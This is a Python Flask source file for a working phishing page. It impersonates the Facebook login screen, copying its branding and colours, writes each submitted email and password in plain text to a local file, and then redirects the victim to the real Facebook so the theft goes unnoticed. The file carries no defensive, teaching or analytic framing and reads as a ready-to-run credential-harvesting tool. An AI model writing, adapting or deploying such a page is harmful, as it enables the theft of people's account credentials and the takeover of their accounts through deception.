from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

def save_info(email, password, filename="info.txt"):
    with open(filename, "a") as file:
        file.write(f"Email: {email}, Password: {password}\n")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        save_info(email, password)
        return redirect("https://www.facebook.com")  # Redirect to Facebook after saving info

    return render_template_string('''
        <!doctype html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Facebook Login</title>
            <style>
                body {
                    background-color: #f0f2f5;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                }
                .login-container {
                    background-color: #fff;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                    text-align: center;
                    width: 300px;
                    position: relative;
                    animation: fadeIn 2s ease-in-out;
                }
                @keyframes fadeIn {
                    from { opacity: 0; transform: scale(0.8); }
                    to { opacity: 1; transform: scale(1); }
                }
                .login-container h1 {
                    color: #1877f2; /* Facebook blue */
                    font-size: 2em;
                    margin-bottom: 20px;
                    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
                }
                .login-container input[type="email"], .login-container input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    transition: border 0.3s, box-shadow 0.3s;
                }
                .login-container input[type="email"]:focus, .login-container input[type="password"]:focus {
                    border: 1px solid #1877f2;
                    box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
                    outline: none;
                }
                .login-container input[type="submit"] {
                    width: 100%;
                    padding: 10px;
                    background-color: #1877f2;
                    border: none;
                    color: white;
                    font-size: 1em;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s, transform 0.3s;
                }
                .login-container input[type="submit"]:hover {
                    background-color: #165cdb;
                    transform: scale(1.05);
                }
                .login-container input[type="submit"]:active {
                    transform: scale(0.95);
                }
                .background-animation {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: linear-gradient(45deg, rgba(24, 119, 242, 0.1), rgba(0, 0, 0, 0.1));
                    animation: bgMove 10s linear infinite;
                    z-index: -2;
                }
                @keyframes bgMove {
                    0% { background-position: 0 0; }
                    100% { background-position: 200% 200%; }
                }
            </style>
        </head>
        <body>
            <div class="background-animation"></div>
            <div class="login-container">
                <h1>Facebook</h1>
                <form method="POST">
                    <input type="email" id="email" name="email" placeholder="Email" required><br>
                    <input type="password" id="password" name="password" placeholder="Password" required><br><br>
                    <input type="submit" value="Log In">
                </form>
            </div>
        </body>
        </html>
    ''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=81)
